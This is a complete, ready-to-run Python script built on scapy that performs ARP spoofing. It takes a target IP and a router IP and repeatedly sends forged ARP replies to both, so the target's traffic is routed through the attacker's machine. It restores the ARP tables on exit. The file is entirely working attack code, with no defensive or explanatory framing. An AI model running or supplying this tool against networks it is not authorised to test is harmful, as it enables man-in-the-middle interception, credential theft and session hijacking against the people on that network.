from scapy.all import *
import time
import argparse


class ArpSpoof:

    def get_ips(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--target_ip", dest="target_ip", help="PROVIDE THE TARGET'S IP")
        parser.add_argument("-r", "--router_ip", dest="router_ip", help="PROVIDE THE GATEWAY/ROUTER'S IP")
        values = parser.parse_args()
        if not values.target_ip:
            parser.error("[-] PLEASE PROVIDE THE TARGET'S IP")
        if not values.router_ip:
            parser.error("[-] PLEASE PROVIDE THE GATEWAY/ROUTER'S IP")
        return values

    def spoof(self, target_ip, router_ip):
        target_mac = getmacbyip(target_ip)
        pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
        send(pkt, verbose=False)

    def restore_arp_table(self, dst_ip, src_ip):
        dst_mac = getmacbyip(dst_ip)
        src_mac = getmacbyip(src_ip)
        pkt = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
        send(pkt, count=4, verbose=False)

    def execute_arp_spoof(self):
        values = self.get_ips()
        try:
            pkt_count = 0
            while True:
                self.spoof(values.target_ip, values.router_ip)
                self.spoof(values.router_ip, values.target_ip)
                pkt_count += 2
                print("\r[+] Packet sent >> " + str(pkt_count), end="")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n[-] Detected CTRL+C .....UPDATING ARP TABLE .....PLEASE WAIT :)")
            self.restore_arp_table(values.target_ip, values.router_ip)
            self.restore_arp_table(values.router_ip, values.target_ip)


obj = ArpSpoof()
obj.execute_arp_spoof()


